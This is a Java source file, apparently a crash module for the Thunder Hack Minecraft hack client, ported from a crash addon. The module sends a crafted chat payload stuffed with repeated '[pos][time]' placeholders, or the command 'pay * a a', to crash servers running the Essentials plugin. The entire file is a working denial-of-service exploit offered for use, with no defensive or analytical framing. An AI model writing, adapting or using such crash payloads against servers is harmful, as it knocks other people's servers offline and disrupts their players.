// Ported from HackVogel/meteor-crash-addon (MIT License)
package thunder.hack.features.modules.crash;

import thunder.hack.features.modules.Module;
import thunder.hack.setting.Setting;

public class EssentialsCrash extends Module {
    private final Setting<Mode> mode = new Setting<>("Mode", Mode.Chat);
    private boolean sent = false;

    public EssentialsCrash() {
        super("EssentialsCrash", Category.CRASH);
    }

    @Override
    public void onEnable() {
        sent = false;
    }

    @Override
    public void onUpdate() {
        if (mc.player == null || sent) return;
        sent = true;

        switch (mode.getValue()) {
            case Chat -> mc.player.networkHandler.sendChatMessage("[pos]<chat=2eb10939-d3a4-4355-a906-dd49649aacbf:[time]:>[pos][time][pos][time][pos][time][pos][time][pos][time][pos][time][pos][time][pos][time][pos][time][pos][time][pos][time][pos][time][pos][time][pos][time][pos][time][pos][time][pos][time][pos][time]");
            case Command -> mc.player.networkHandler.sendCommand("pay * a a");
        }
        sendMessage("Essentials crash sent");
        disable();
    }

    @Override
    public void onDisable() {
        sent = false;
    }

    public enum Mode {
        Chat, Command
    }
}
